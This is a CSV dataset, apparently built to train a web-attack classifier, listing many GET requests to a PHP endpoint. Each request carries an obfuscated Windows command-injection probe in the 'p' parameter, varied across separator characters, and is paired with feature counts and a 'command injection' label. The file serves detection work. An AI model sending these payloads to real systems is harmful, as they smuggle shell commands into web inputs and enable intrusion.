method,path,body,single_q,double_q,dashes,braces,spaces,SQL Badwords,XSS Badwords,Command Injection Badords,class
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(65%2b74)""')%20do%20@set%20/p%20=%20evmxlz%ievmxlzevmxlz<%20nul""",,2,17,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(77%2b81)""')%20do%20@set%20/p%20=%20siypku%isiypkusiypku<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(37%2b61)""')%20do%20@set%20/p%20=%20kfevvi%ikfevvikfevvi<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(25%2b34)""')%20do%20@set%20/p%20=%20fgmwks%ifgmwksfgmwks<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(12%2b29)""')%20do%20@set%20/p%20=%20xptwhq%ixptwhqxptwhq<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(74%2b78)""')%20do%20@set%20/p%20=%20wdzhmc%iwdzhmcwdzhmc<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(57%2b98)""')%20do%20@set%20/p%20=%20lcwpnn%ilcwpnnlcwpnn<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(52%2b36)""')%20do%20@set%20/p%20=%20zdqign%izdqignzdqign<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(33%2b63)""')%20do%20@set%20/p%20=%20vqpmlz%ivqpmlzvqpmlz<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(46%2b31)""')%20do%20@set%20/p%20=%20ncufmj%incufmjncufmj<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(60%2b78)""')%20do%20@set%20/p%20=%20uydozq%iuydozquydozq<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(84%2b50)""')%20do%20@set%20/p%20=%20mhjbxn%imhjbxnmhjbxn<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(97%2b3)""')%20do%20@set%20/p%20=%20nnwwue%innwwuennwwue<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(66%2b21)""')%20do%20@set%20/p%20=%20ngvwrb%ingvwrbngvwrb<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(44%2b45)""')%20do%20@set%20/p%20=%20qouahq%iqouahqqouahq<%20nul&&",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(0%2b55)""')%20do%20@set%20/p%20=%20yxbhxp%iyxbhxpyxbhxp<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(72%2b33)""')%20do%20@set%20/p%20=%20hvdllv%ihvdllvhvdllv<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(20%2b79)""')%20do%20@set%20/p%20=%20mwbtak%imwbtakmwbtak<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(36%2b69)""')%20do%20@set%20/p%20=%20ydstxv%iydstxvydstxv<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(83%2b14)""')%20do%20@set%20/p%20=%20lmkaeu%ilmkaeulmkaeu<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(98%2b55)""')%20do%20@set%20/p%20=%20aiegae%iaiegaeaiegae<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(42%2b52)""')%20do%20@set%20/p%20=%20dqjplb%idqjplbdqjplb<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(62%2b40)""')%20do%20@set%20/p%20=%20ctasjg%ictasjgctasjg<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(44%2b16)""')%20do%20@set%20/p%20=%20fqqdkk%ifqqdkkfqqdkk<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(2%2b21)""')%20do%20@set%20/p%20=%20bwblnw%ibwblnwbwblnw<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(46%2b74)""')%20do%20@set%20/p%20=%20isvrto%iisvrtoisvrto<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(24%2b44)""')%20do%20@set%20/p%20=%20rluwqy%irluwqyrluwqy<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(80%2b96)""')%20do%20@set%20/p%20=%20xrudky%ixrudkyxrudky<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(89%2b85)""')%20do%20@set%20/p%20=%20tdwiox%itdwioxtdwiox<%20nul%26%26",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(33%2b95)""')%20do%20@set%20/p%20=%20rirqsx%irirqsxrirqsx<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(64%2b46)""')%20do%20@set%20/p%20=%20wmkqmg%iwmkqmgwmkqmg<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(26%2b3)""')%20do%20@set%20/p%20=%20qmcnhb%iqmcnhbqmcnhb<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(93%2b1)""')%20do%20@set%20/p%20=%20hgzdjj%ihgzdjjhgzdjj<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(34%2b79)""')%20do%20@set%20/p%20=%20abprle%iabprleabprle<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(26%2b46)""')%20do%20@set%20/p%20=%20othpnj%iothpnjothpnj<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(7%2b35)""')%20do%20@set%20/p%20=%20mtnsyn%imtnsynmtnsyn<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(67%2b21)""')%20do%20@set%20/p%20=%20uolsox%iuolsoxuolsox<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(65%2b63)""')%20do%20@set%20/p%20=%20sjbpxg%isjbpxgsjbpxg<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(81%2b65)""')%20do%20@set%20/p%20=%20gflyce%igflycegflyce<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(0%2b52)""')%20do%20@set%20/p%20=%20bqrytr%ibqrytrbqrytr<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(30%2b84)""')%20do%20@set%20/p%20=%20izaxpw%iizaxpwizaxpw<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(32%2b72)""')%20do%20@set%20/p%20=%20keelov%ikeelovkeelov<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(22%2b67)""')%20do%20@set%20/p%20=%20amjmww%iamjmwwamjmww<%20nul|",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(87%2b43)""')%20do%20@set%20/p%20=%20cjftqs%icjftqscjftqs<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(99%2b15)""')%20do%20@set%20/p%20=%20vybufu%ivybufuvybufu<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(75%2b52)""')%20do%20@set%20/p%20=%20mooldr%imooldrmooldr<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(77%2b64)""')%20do%20@set%20/p%20=%20jyilct%ijyilctjyilct<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(65%2b9)""')%20do%20@set%20/p%20=%20dzbgwo%idzbgwodzbgwo<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(35%2b13)""')%20do%20@set%20/p%20=%20gxpsxl%igxpsxlgxpsxl<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(67%2b75)""')%20do%20@set%20/p%20=%20wtuwuc%iwtuwucwtuwuc<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(74%2b56)""')%20do%20@set%20/p%20=%20sxiama%isxiamasxiama<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(1%2b97)""')%20do%20@set%20/p%20=%20jpkmfx%ijpkmfxjpkmfx<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(3%2b93)""')%20do%20@set%20/p%20=%20askwjz%iaskwjzaskwjz<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(74%2b89)""')%20do%20@set%20/p%20=%20lqensd%ilqensdlqensd<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(31%2b20)""')%20do%20@set%20/p%20=%20fpixwy%ifpixwyfpixwy<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(19%2b19)""')%20do%20@set%20/p%20=%20oczxxi%ioczxxioczxxi<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(81%2b27)""')%20do%20@set%20/p%20=%20vlnbwd%ivlnbwdvlnbwd<%20nul%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(12%2b93)""')%20do%20@set%20/p%20=%20smmlyx%ismmlyxsmmlyx<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(38%2b22)""')%20do%20@set%20/p%20=%20yrsuac%iyrsuacyrsuac<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(4%2b50)""')%20do%20@set%20/p%20=%20dcglgg%idcglggdcglgg<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(14%2b63)""')%20do%20@set%20/p%20=%20limqcf%ilimqcflimqcf<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(36%2b20)""')%20do%20@set%20/p%20=%20hftepf%ihftepfhftepf<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(42%2b54)""')%20do%20@set%20/p%20=%20onwamg%ionwamgonwamg<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(10%2b90)""')%20do%20@set%20/p%20=%20unfodi%iunfodiunfodi<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(40%2b71)""')%20do%20@set%20/p%20=%20yohfff%iyohfffyohfff<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(34%2b23)""')%20do%20@set%20/p%20=%20vvylkk%ivvylkkvvylkk<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(10%2b75)""')%20do%20@set%20/p%20=%20cwohci%icwohcicwohci<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(48%2b19)""')%20do%20@set%20/p%20=%20jluuay%ijluuayjluuay<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(22%2b61)""')%20do%20@set%20/p%20=%20qgjank%iqgjankqgjank<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(99%2b25)""')%20do%20@set%20/p%20=%20sxwlla%isxwllasxwlla<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(97%2b80)""')%20do%20@set%20/p%20=%20keusxb%ikeusxbkeusxb<%20nul||",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(63%2b76)""')%20do%20@set%20/p%20=%20zkrbzh%izkrbzhzkrbzh<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(15%2b62)""')%20do%20@set%20/p%20=%20qtziwy%iqtziwyqtziwy<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(44%2b22)""')%20do%20@set%20/p%20=%20lucffs%ilucffslucffs<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(87%2b84)""')%20do%20@set%20/p%20=%20vthnzv%ivthnzvvthnzv<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(64%2b42)""')%20do%20@set%20/p%20=%20fpzbma%ifpzbmafpzbma<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(16%2b54)""')%20do%20@set%20/p%20=%20qyfuqe%iqyfuqeqyfuqe<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(62%2b18)""')%20do%20@set%20/p%20=%20njxhqf%injxhqfnjxhqf<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(17%2b53)""')%20do%20@set%20/p%20=%20bislmo%ibislmobislmo<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(70%2b44)""')%20do%20@set%20/p%20=%20iblcda%iiblcdaiblcda<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(7%2b70)""')%20do%20@set%20/p%20=%20pbriis%ipbriispbriis<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1||for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(51%2b62)""')%20do%20@set%20/p%20=%20etolpl%ietolpletolpl<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%7c%7cfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(99%2b49)""')%20do%20@set%20/p%20=%20zrsyqh%izrsyqhzrsyqh<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(92%2b67)""')%20do%20@set%20/p%20=%20tgoqof%itgoqoftgoqof<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%0d%0afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(55%2b67)""')%20do%20@set%20/p%20=%20bxxumq%ibxxumqbxxumq<%20nul%7c%7c",,2,16,0,2,15,0,0,1,command injection
GET,"/multi/js-object3.php?p=1for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(29%2b32)""')%20do%20@set%20/p%20=%20enhokl%ienhoklenhokl<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1;for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(98%2b9)""')%20do%20@set%20/p%20=%20mzsfvs%imzsfvsmzsfvs<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%3bfor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(28%2b36)""')%20do%20@set%20/p%20=%20kzxyfi%ikzxyfikzxyfi<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(5%2b3)""')%20do%20@set%20/p%20=%20umeofb%iumeofbumeofb<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(99%2b61)""')%20do%20@set%20/p%20=%20soqnmn%isoqnmnsoqnmn<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%1afor%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(74%2b69)""')%20do%20@set%20/p%20=%20btrhsu%ibtrhsubtrhsu<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1&&for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(10%2b76)""')%20do%20@set%20/p%20=%20gpkrjb%igpkrjbgpkrjb<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1%26%26for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(83%2b92)""')%20do%20@set%20/p%20=%20hjghvw%ihjghvwhjghvw<%20nul%20",,2,16,0,2,16,0,0,1,command injection
GET,"/multi/js-object3.php?p=1|for%20/f%20""""t""""o""""k""""e""""n""""s""=*""%20%i%20in%20('cmd%20/c%20""set%20/a%20(3%2b11)""')%20do%20@set%20/p%20=%20ktwmym%iktwmymktwmym<%20nul%20",,2,16,0,2,16,0,0,1,command injection
